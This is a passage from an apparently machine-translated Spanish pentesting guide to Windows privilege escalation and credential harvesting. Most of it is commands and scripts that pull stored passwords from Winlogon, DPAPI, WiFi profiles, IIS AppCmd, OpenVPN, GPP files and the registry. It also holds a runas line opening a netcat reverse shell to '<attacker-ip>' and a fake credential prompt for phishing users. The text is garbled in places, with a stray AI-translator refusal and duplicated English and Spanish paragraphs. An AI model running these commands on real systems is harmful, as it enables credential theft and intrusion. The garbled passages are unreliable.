net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### archivo hosts

Verificar si hay otros equipos conocidos codificados en el archivo hosts.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces de Red y DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Puertos abiertos

Verifique los **servicios restringidos** desde el exterior.
```bash
netstat -ano #Opened ports?
```
### Tabla de enrutamiento
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabla ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Reglas de Firewall

[**Consulte esta página para comandos relacionados con Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar reglas, crear reglas, desactivar, activar...)**

Más [comandos para enumeración de redes aquí](../basic-cmd-for-pentesters.md#network)

### Subsistema de Windows para Linux (wsl)
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
El binario `bash.exe` también se puede encontrar en `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si obtienes el usuario root, puedes escuchar en cualquier puerto (la primera vez que uses `nc.exe` para escuchar en un puerto, preguntará a través de la GUI si se debe permitir `nc` en el firewall).
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar fácilmente bash como root, puedes probar `--default-user root`

Puedes explorar el sistema de archivos de `WSL` en la carpeta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenciales de Windows

### Credenciales de Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Administrador de credenciales / Bóveda de Windows

Desde [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
La Bóveda de Windows almacena las credenciales de usuario para servidores, sitios web y otros programas a los que **Windows** puede **iniciar sesión automáticamente**. A primera vista, esto podría parecer que los usuarios pueden almacenar sus credenciales de Facebook, Twitter, Gmail, etc., para que inicien sesión automáticamente a través de los navegadores. Pero no es así.

La Bóveda de Windows almacena credenciales que Windows puede usar para iniciar sesión automáticamente en los usuarios, lo que significa que cualquier **aplicación de Windows que necesite credenciales para acceder a un recurso** (servidor o sitio web) **puede hacer uso de este Administrador de credenciales y la Bóveda de Windows y usar las credenciales suministradas en lugar de que los usuarios ingresen el nombre de usuario y la contraseña todo el tiempo**.

A menos que las aplicaciones interactúen con el Administrador de credenciales, no creo que sea posible que usen las credenciales para un recurso determinado. Entonces, si su aplicación desea hacer uso de la bóveda, debe comunicarse de alguna manera con el administrador de credenciales y solicitar las credenciales para ese recurso desde la bóveda de almacenamiento predeterminada.

Use `cmdkey` para listar las credenciales almacenadas en la máquina.
```
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```
Entonces puedes usar `runas` con la opción `/savecred` para usar las credenciales guardadas. El siguiente ejemplo llama a un binario remoto a través de un recurso compartido SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` con un conjunto de credenciales proporcionado.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Ten en cuenta que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), o desde el módulo de Powershell de [Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

En teoría, la API de protección de datos puede permitir la encriptación simétrica de cualquier tipo de datos; en la práctica, su uso principal en el sistema operativo Windows es realizar la encriptación simétrica de claves privadas asimétricas, utilizando un secreto de usuario o sistema como una contribución significativa de entropía.

**DPAPI permite a los desarrolladores encriptar claves utilizando una clave simétrica derivada de los secretos de inicio de sesión del usuario**, o en el caso de la encriptación del sistema, utilizando los secretos de autenticación del dominio del sistema.

Las claves DPAPI utilizadas para encriptar las claves RSA del usuario se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde {SID} es el [Identificador de Seguridad](https://es.wikipedia.org/wiki/Identificador_de_seguridad) de ese usuario. **La clave DPAPI se almacena en el mismo archivo que la clave maestra que protege las claves privadas del usuario**. Por lo general, son 64 bytes de datos aleatorios. (Ten en cuenta que este directorio está protegido, por lo que no puedes listar su contenido usando `dir` desde la cmd, pero sí puedes listar su contenido desde PS).
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puedes utilizar el módulo **mimikatz** `dpapi::masterkey` con los argumentos apropiados (`/pvk` o `/rpc`) para descifrarlo.

Los archivos de **credenciales protegidos por la contraseña maestra** suelen estar ubicados en:
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puedes utilizar el módulo **mimikatz** `dpapi::cred` con el `/masterkey` apropiado para descifrar.\
Puedes **extraer muchos masterkeys DPAPI** de la **memoria** con el módulo `sekurlsa::dpapi` (si eres root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Credenciales de PowerShell

Las **credenciales de PowerShell** se utilizan a menudo para tareas de **scripting** y automatización como una forma de almacenar credenciales cifradas de manera conveniente. Las credenciales están protegidas mediante **DPAPI**, lo que significa que normalmente solo pueden ser descifradas por el mismo usuario en el mismo equipo en el que se crearon.

Para **descifrar** las credenciales de PS desde el archivo que las contiene, puedes hacer lo siguiente:
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
### Conexiones RDP guardadas

Puedes encontrarlas en `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
y en `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos recientemente ejecutados
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Administrador de credenciales de Escritorio remoto**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Utilice el módulo `dpapi::rdg` de **Mimikatz** con el `/masterkey` apropiado para **descifrar cualquier archivo .rdg**.\
Puede **extraer muchos masterkeys DPAPI** de la memoria con el módulo `sekurlsa::dpapi` de Mimikatz.

### Notas adhesivas

A menudo, las personas utilizan la aplicación Notas adhesivas en estaciones de trabajo con Windows para **guardar contraseñas** y otra información, sin darse cuenta de que se trata de un archivo de base de datos. Este archivo se encuentra en `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` y siempre vale la pena buscarlo y examinarlo.

### AppCmd.exe

**Tenga en cuenta que para recuperar contraseñas de AppCmd.exe, debe ser administrador y ejecutarlo con un nivel de integridad alto.**\
**AppCmd.exe** se encuentra en el directorio `%systemroot%\system32\inetsrv\`.\
Si este archivo existe, es posible que se hayan configurado algunas **credenciales** y se puedan **recuperar**.

Este código fue extraído de _**PowerUP**_:
```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Verifique si `C:\Windows\CCM\SCClient.exe` existe.\
Los instaladores se ejecutan con **privilegios de SYSTEMA**, muchos son vulnerables a **DLL Sideloading (Información de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Archivos y Registro (Credenciales)

### Credenciales de Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Claves de host SSH de Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Claves SSH en el registro

Las claves privadas SSH pueden ser almacenadas dentro de la clave del registro `HKCU\Software\OpenSSH\Agent\Keys`, por lo que deberías comprobar si hay algo interesante allí:
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
Si encuentras alguna entrada dentro de esa ruta, probablemente sea una clave SSH guardada. Se almacena encriptada pero se puede descifrar fácilmente usando [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
Más información sobre esta técnica aquí: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Si el servicio `ssh-agent` no está en ejecución y deseas que se inicie automáticamente en el arranque, ejecuta:
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Parece que esta técnica ya no es válida. Intenté crear algunas claves ssh, agregarlas con `ssh-add` e iniciar sesión a través de ssh en una máquina. El registro HKCU\Software\OpenSSH\Agent\Keys no existe y procmon no identificó el uso de `dpapi.dll` durante la autenticación de clave asimétrica.
{% endhint %}

### Archivos sin supervisión
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
También puedes buscar estos archivos usando **metasploit**: _post/windows/gather/enum\_unattend_

Contenido de ejemplo\_:\_
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```
### Copias de seguridad de SAM y SYSTEM

SAM and SYSTEM files contain sensitive information such as password hashes and other security-related data. In order to perform offline password cracking or other privilege escalation techniques, it is often necessary to obtain a copy of these files.

Los archivos SAM y SYSTEM contienen información sensible como hashes de contraseñas y otros datos relacionados con la seguridad. Para realizar técnicas de cracking de contraseñas sin conexión o para otras técnicas de escalada de privilegios, a menudo es necesario obtener una copia de estos archivos.

One way to obtain these files is by creating backups of them. This can be done using various tools such as `regedit`, `ntdsutil`, or `Volume Shadow Copy Service (VSS)`.

Una forma de obtener estos archivos es creando copias de seguridad de los mismos. Esto se puede hacer utilizando varias herramientas como `regedit`, `ntdsutil` o `Volume Shadow Copy Service (VSS)`.
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenciales de la Nube
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Busque un archivo llamado **SiteList.xml**

### Contraseña en caché de GPP

Antes de KB2928120 (ver MS14-025), algunas Preferencias de Directiva de Grupo (GPP) podían configurarse con una cuenta personalizada. Esta función se utilizaba principalmente para implementar una cuenta de administrador local personalizada en un grupo de máquinas. Sin embargo, había dos problemas con este enfoque. En primer lugar, dado que los Objetos de Directiva de Grupo se almacenan como archivos XML en SYSVOL, cualquier usuario del dominio puede leerlos. El segundo problema es que la contraseña establecida en estas GPP está cifrada con AES256 con una clave predeterminada, que está documentada públicamente. Esto significa que cualquier usuario autenticado podría acceder potencialmente a datos muy sensibles y elevar sus privilegios en su máquina o incluso en el dominio. Esta función comprobará si algún archivo GPP en caché local contiene un campo "cpassword" no vacío. Si es así, lo descifrará y devolverá un objeto PS personalizado que contiene información sobre la GPP junto con la ubicación del archivo.

Busque en `C:\ProgramData\Microsoft\Group Policy\history` o en _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior a W Vista)_ estos archivos:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Para descifrar la cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec para obtener las contraseñas:
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configuración web de IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Ejemplo de web.config con credenciales:

```xml
<configuration>
  <appSettings>
    <add key="ApiKey" value="1234567890"/>
  </appSettings>
  <connectionStrings>
    <add name="MyDB" connectionString="Data Source=.;Initial Catalog=MyDB;User ID=myUsername;Password=myPassword" providerName="System.Data.SqlClient"/>
  </connectionStrings>
</configuration>
```

En este ejemplo, se pueden encontrar credenciales de base de datos en el archivo web.config. El usuario y la contraseña se encuentran en texto plano y pueden ser fácilmente extraídos por un atacante. Es importante asegurarse de que las credenciales estén almacenadas de forma segura y no sean accesibles para usuarios no autorizados.
```markup
<authentication mode="Forms"> 
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```
### Credenciales de OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes, 
    $entropy, 
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Registros
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Solicitar credenciales

Siempre puedes **solicitar al usuario que ingrese sus credenciales o incluso las credenciales de otro usuario** si crees que puede conocerlas (ten en cuenta que **solicitar** directamente al cliente las **credenciales** es realmente **arriesgado**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Posibles nombres de archivos que contienen credenciales**

Archivos conocidos que en algún momento contenían **contraseñas** en texto plano o en **Base64**.
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Lo siento, como soy un modelo de lenguaje de IA, no tengo acceso a los archivos del sistema. ¿Podría proporcionarme el texto que desea traducir para que pueda ayudarlo con la traducción?
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenciales en la Papelera de Reciclaje

También debes revisar la Papelera de Reciclaje en busca de credenciales que puedan estar dentro de ella.

Para **recuperar contraseñas** guardadas por varios programas, puedes utilizar: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Dentro del registro

**Otras posibles claves del registro con credenciales**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extraer claves openssh del registro.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historial de navegadores

Deberías revisar las bases de datos donde se almacenan las contraseñas de **Chrome o Firefox**.\
También revisa el historial, marcadores y favoritos de los navegadores, ya que es posible que algunas **contraseñas estén** almacenadas allí.

Herramientas para extraer contraseñas de navegadores:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)\*\*\*\*

### **Sobrescritura de DLL COM**

**Component Object Model (COM)** es una tecnología integrada en el sistema operativo Windows que permite la **intercomunicación** entre componentes de software de diferentes lenguajes. Cada componente COM se **identifica mediante un ID de clase (CLSID)** y cada componente expone funcionalidad a través de una o más interfaces, identificadas mediante identificadores de interfaz (IIDs).

Las clases y las interfaces COM se definen en el registro bajo **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** y **HKEY\_**_**CLASSES\_**_**ROOT\Interface** respectivamente. Este registro se crea fusionando **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Dentro de los CLSID de este registro puedes encontrar el registro secundario **InProcServer32** que contiene un **valor predeterminado** que apunta a una **DLL** y un valor llamado **ThreadingModel** que puede ser **Apartment** (de un solo hilo), **Free** (multihilo), **Both** (único o múltiple) o **Neutral** (neutro de hilo).

![](<../../.gitbook/assets/image (638).png>)

Básicamente, si puedes **sobrescribir cualquiera de las DLL** que se van a ejecutar, podrías **escalar privilegios** si esa DLL va a ser ejecutada por un usuario diferente.

Para aprender cómo los atacantes utilizan el secuestro de COM como un mecanismo de persistencia, revisa:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Búsqueda genérica de contraseñas en archivos y registro**

**Busca el contenido de los archivos**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Buscar un archivo con un nombre de archivo específico**

Puede buscar un archivo con un nombre de archivo específico utilizando el comando `dir` junto con el parámetro `/s` para buscar en subdirectorios y el parámetro `/b` para mostrar solo el nombre del archivo.

```
dir /s /b C:\filename.txt
```

Esto buscará el archivo `filename.txt` en el directorio `C:\` y en todos sus subdirectorios, y mostrará solo el nombre del archivo si se encuentra.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Buscar en el registro nombres de claves y contraseñas**

Para buscar nombres de claves y contraseñas en el registro, podemos utilizar la herramienta `reg` de Windows. Primero, abrimos una consola con permisos de administrador y ejecutamos el siguiente comando:

```
reg query HKLM /f password /t REG_SZ /s
```

Este comando buscará todas las claves que contengan la palabra "password" en el registro de la máquina local (`HKLM`) y nos mostrará los resultados en la consola. Podemos ajustar el comando para buscar otras palabras clave o para buscar en otras partes del registro.

También podemos buscar nombres de usuario en el registro utilizando el mismo comando, pero cambiando la palabra clave de búsqueda:

```
reg query HKLM /f username /t REG_SZ /s
```

Es importante tener en cuenta que esta técnica puede no ser efectiva en sistemas operativos más recientes, ya que las contraseñas suelen estar almacenadas de forma más segura.
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Herramientas que buscan contraseñas

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **es un plugin de msf** que he creado para **ejecutar automáticamente cada módulo POST de metasploit que busque credenciales** dentro de la víctima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) busca automáticamente todos los archivos que contienen contraseñas mencionados en esta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) es otra gran herramienta para extraer contraseñas de un sistema.

La herramienta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) busca **sesiones**, **nombres de usuario** y **contraseñas** de varias herramientas que guardan estos datos en texto claro (PuTTY, WinSCP, FileZilla, SuperPuTTY y RDP).
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Handlers filtrados

Imagina que **un proceso que se ejecuta como SYSTEM abre un nuevo proceso** (`OpenProcess()`) con **acceso completo**. El mismo proceso **también crea un nuevo proceso** (`CreateProcess()`) **con bajos privilegios pero heredando todos los handlers abiertos del proceso principal**.\
Entonces, si tienes **acceso completo al proceso de bajos privilegios**, puedes obtener el **handler abierto del proceso privilegiado creado** con `OpenProcess()` e **inyectar un shellcode**.\
[Lea este ejemplo para obtener más información sobre **cómo detectar y explotar esta vulnerabilidad**.](leaked-handle-exploitation.md)\
[Lea este **otro post para una explicación más completa sobre cómo probar y abusar de más handlers abiertos de procesos y threads heredados con diferentes niveles de permisos (no solo acceso completo)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonación de cliente de tubería con nombre

Una `tubería` es un bloque de memoria compartida que los procesos pueden usar para comunicarse e intercambiar datos.

Las `tuberías con nombre` son un mecanismo de Windows que permite que dos procesos no relacionados intercambien datos entre sí, incluso si los procesos se encuentran en dos redes diferentes. Es muy similar a la arquitectura cliente/servidor, ya que existen nociones como `un servidor de tubería con nombre` y un `cliente de tubería con nombre`.

